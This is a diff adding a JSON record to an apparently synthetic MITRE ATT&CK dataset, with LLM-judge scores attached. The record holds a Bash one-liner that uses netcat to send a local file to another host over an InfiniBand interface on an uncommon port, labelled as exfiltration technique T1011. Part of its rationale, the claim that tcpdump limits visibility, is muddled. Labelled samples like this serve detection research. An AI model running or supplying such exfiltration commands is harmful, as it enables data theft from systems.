@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i ib0 -nn tcp port 56473 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.0.0.10 10.0.0.20 56473 < /var/tmp/pkg.cache",
+  "explanation": "Sends data over an InfiniBand IPoIB interface (ib0) using an uncommon TCP port, with tcpdump silently observing only that traffic. This uses a distinct fabric medium, aligning with T1011.",
+  "rationale_steps": [
+    "Leverage ib0 (InfiniBand) to move data off the primary Ethernet/Wi\u2011Fi.",
+    "Use high TCP port 56473 to avoid common ports.",
+    "Start tcpdump scoped to the ib0 interface to limit visibility.",
+    "nc with -s binds to ib0's IP to force the alternate fabric path."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-d4a843bf",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash one-liner with correct use of nohup, redirections, backgrounding, tcpdump BPF filter, and nc flags, with valid separators and no quoting issues.",
+        "semantic_score": 4,
+        "semantic_justification": "Netcat exfiltrates the file bound to the IPoIB address to an uncommon TCP port while tcpdump passively monitors ib0, aligning with T1011, though tcpdump typically requires elevated privileges and success presumes a listening peer.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:08:37.417375Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns well with T1011 by exfiltrating data over an InfiniBand network interface (ib0) which is a separate network medium, though the tcpdump portion is monitoring rather than exfiltrating and may be unnecessary for the technique.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:08:40.632779Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax for both nohup/tcpdump and nc, proper command separators, and valid flags.",
+        "semantic_score": 4,
+        "semantic_justification": "The `nc` component perfectly aligns with T1011 by exfiltrating data over a distinct InfiniBand medium using an uncommon port, but the `tcpdump` component would likely fail due to insufficient privileges ('None'), thus not fully meeting the command's stated intent for self-observation.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:09:07.020558Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
